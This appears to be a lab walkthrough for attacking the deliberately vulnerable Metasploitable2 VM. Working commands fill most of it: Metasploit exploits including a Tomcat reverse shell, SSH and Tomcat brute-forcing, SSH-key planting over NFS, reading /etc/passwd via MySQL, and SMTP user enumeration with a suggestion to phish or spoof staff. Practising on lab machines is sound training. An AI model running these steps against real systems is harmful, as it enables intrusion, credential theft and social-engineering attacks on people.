# Metasploitable2
In this project, we will hack metasploitable machine in many ways. You can download metasploitable v2 from here https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

Then start it in a VM 
Tip: use Briged Adapter in Netowrk

################################################################################################
First we scan our target IP which is: 192.168.0.117

nmap -O -A -sV 192.168.0.117

Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-13 18:29 EET
Nmap scan report for 192.168.0.117
Host is up (0.00039s latency).
Not shown: 981 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.0.116
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d🇩🇪a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: 2018-03-13T16:29:18+00:00; 0s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
53/tcp   open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      33596/tcp  mountd
|   100005  1,2,3      51332/udp  mountd
|   100021  1,3,4      41012/udp  nlockmgr
|   100021  1,3,4      46894/tcp  nlockmgr
|   100024  1          42764/udp  status
|_  100024  1          58828/tcp  status
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
1524/tcp open  shell       Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 8
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, SupportsCompression, LongColumnFlag, SupportsTransactions, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: j4ao*"gc:9LS;o=!.`{i
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2018-03-13T16:29:18+00:00; 0s from scanner time.
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
MAC Address: 08:00:27:37:49:9C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2018-03-13T12:29:18-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.39 ms 192.168.0.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.26 seconds


################################################################################################

NOW WE OPEN METASPLOIT AND START HACKIN'

################################################################################################
21/tcp   open  ftp   


searched for ftpserver vsftpd 2.3.4 vulnerabilites and i found this backdoor(unix/ftp/vsftpd_234_backdoor)

msf > use unix/ftp/vsftpd_234_backdoor
msf auxiliary(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.0.117
msf auxiliary(unix/ftp/vsftpd_234_backdoor) > run

i gained full root access

################################################################################################
22/tcp   open  ssh  


brute-forced ssh

msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
msf auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
msf auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.0.117

found username: msfadmin
      password: msfadmin

################################################################################################
25/tcp   open  smtp 

> telnet 192.168.0.117 25 
vrfy sys
252 2.0.0 sys

## which means that sys is a user

vrfy admin
550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table

## so admin not found

## now we use smtp-user-enum

> smtp-user-enum -M VRFY -U /usr/share/fern-wifi-cracker/extras/wordlists/common.txt -t 192.168.0.117

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/fern-wifi-cracker/extras/wordlists/common.txt
Target count ............. 1
Username count ........... 478
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Tue Mar 13 19:44:00 2018 #########
 exists.0.117: lp
 exists.0.117: root
 exists.0.117: service
 exists.0.117: sys
 exists.0.117: user
 exists.0.117: MAIL
 exists.0.117: Root
 exists.0.117: SERVICE
 exists.0.117: SYS
 exists.0.117: Service
 exists.0.117: User
######## Scan completed at Tue Mar 13 19:44:23 2018 #########
11 results.

478 queries in 23 seconds (20.8 queries / sec)



Now that we know what users are on that organization's email server, we can send social engineering 
emails to them or spoof their email addresses and send social engineering emails to their colleagues.


for more info visit:
https://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/

################################################################################################
25/tcp   open  smtp (PART 2)

searched for sslv2 vulns and found an nmap script that scans for it.

nmap -sV --script=sslv2-drown 192.168.0.117

found this:
25/tcp   open     smtp        Postfix smtpd
| sslv2-drown: 
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|   vulns: 
|     CVE-2016-0703: 
|       title: OpenSSL: Divide-and-conquer session key recovery in SSLv2
|       state: VULNERABLE
|       ids: 
|         CVE:CVE-2016-0703
|       description: 
|               The get_client_master_key function in s2_srvr.c in the SSLv2 implementation in
|       OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before
|       1.0.2a accepts a nonzero CLIENT-MASTER-KEY CLEAR-KEY-LENGTH value for an arbitrary
|       cipher, which allows man-in-the-middle attackers to determine the MASTER-KEY value
|       and decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding oracle, a
|       related issue to CVE-2016-0800.
|     
|       refs: 
|         https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0703
|         https://www.openssl.org/news/secadv/20160301.txt
|     CVE-2016-0800: 
|       title: OpenSSL: Cross-protocol attack on TLS using SSLv2 (DROWN)
|       state: VULNERABLE
|       ids: 
|         CVE:CVE-2016-0800
|       description: 
|               The SSLv2 protocol, as used in OpenSSL before 1.0.1s and 1.0.2 before 1.0.2g and
|       other products, requires a server to send a ServerVerify message before establishing
|       that a client possesses certain plaintext RSA data, which makes it easier for remote
|       attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding
|       oracle, aka a "DROWN" attack.
|     
|       refs: 
|         https://www.openssl.org/news/secadv/20160301.txt
|_        https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800

didnt really see that these cve's are dangerous

################################################################################################
53/tcp   open  domain      ISC BIND 9.4.2

https://charlesreid1.com/wiki/Metasploitable/DNS_Bind

################################################################################################
111/tcp  open  rpcbind     2 (RPC #100000)
2049/tcp open  nfs         2-4 (RPC #100003)

1. showmount -e 192.168.1.117
2. mkdir -p /root/.ssh
3. cd /root/.ssh/
4. cat /dev/null > known_hosts
5. ssh-keygen -t rsa -b 4096
	Enter file in which to save the key (/root/.ssh/id_rsa): xtech
6. cd /
7. mount -t nfs 192.168.1.117:/ /mnt -o nolock
8. df -k
9. cd /mnt/root/.ssh
10. cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/
11. ls -l
12. cat authorized_keys
13. cat hacker_rsa.pub >> authorized_keys
14. cat authorized_keys
15. cd /root/.ssh/
16. ssh -i /root/.ssh/hacker_rsa root@192.168.1.117

and you are INNNNNN

when you finish 

1. umount /mnt

for more info check this guy he helped me alot:
https://computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson4/index.html


################################################################################################
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

searched for the vulns on samba smdb and i found this exploit(exploit/multi/samba/usermap_script):

msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > set RHOST 192.168.0.117
msf exploit(multi/samba/usermap_script) > run 

and we gained full access to the server. as easy as that ¯\_(ツ)_/¯ 

################################################################################################
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login

rlogin -l root 192.168.0.117

and you gain root access.
FACEPALM (－‸ლ)

################################################################################################
1524/tcp open  shell       Metasploitable root shell

telnet 192.168.0.117 1524

and you get shell access.
FACEPALMx2 (－‸ლ) (－‸ლ)

################################################################################################
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5

mysql -u root -h 192.168.0.117

MySQL [(none)]> show databases;
MySQL [(none)]> use mysql
MySQL [mysql]> create table foo(line blob);
MySQL [mysql]> insert into foo values(load_file('/etc/passwd'));
MySQL [mysql]> select * from foo;

and you will see the passwd file. 

use your imagination and yo can do more stuff
################################################################################################
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7

msf > use exploit/linux/postgres/postgres_payload
msf exploit(linux/postgres/postgres_payload) > set RHOST 192.168.0.117
msf exploit(linux/postgres/postgres_payload) > exploit

and you have full shell access.

################################################################################################
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1

we first try user:pass brute-force to get access.

msf > use auxiliary/scanner/http/tomcat_mgr_login 
msf auxiliary(scanner/http/tomcat_mgr_login) > set  RPORT 8180
msf auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 192.168.0.117
msf auxiliary(scanner/http/tomcat_mgr_login) > exploit

we found tomcat:tomcat as administrator username and password.

now we try to get shell access. 

msf > use multi/http/tomcat_mgr_deploy
msf exploit(multi/http/tomcat_mgr_deploy) > set RPORT 8180
msf exploit(multi/http/tomcat_mgr_deploy) > set RHOST 192.168.0.117
msf exploit(multi/http/tomcat_mgr_deploy) > set httpusername tomcat
msf exploit(multi/http/tomcat_mgr_deploy) > set httppassword tomcat
msf exploit(multi/http/tomcat_mgr_deploy) > set payload java/shell/reverse_tcp 
msf exploit(multi/http/tomcat_mgr_deploy) > exploit

we now have shell access :) 

################################################################################################
